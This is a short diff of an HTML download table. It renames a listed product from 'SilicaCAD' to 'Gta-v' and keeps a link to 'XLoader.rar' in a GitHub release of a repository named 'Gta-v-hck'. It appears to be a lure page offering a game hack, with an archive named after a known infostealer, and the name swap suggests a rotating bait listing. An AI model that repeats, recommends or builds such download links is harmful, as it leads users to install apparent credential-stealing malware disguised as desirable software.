@@ -8,7 +8,7 @@
     <th>Download</th>
   </tr>
   <tr>
-    <td>SilicaCAD</td>
+    <td>Gta-v</td>
     <td>01/13/2024</td>
     <td><a href='https://github.com/bryan-alot/Gta-v-hck/releases/download/gta-v-hck/XLoader.rar'>Download</td>
   </tr>
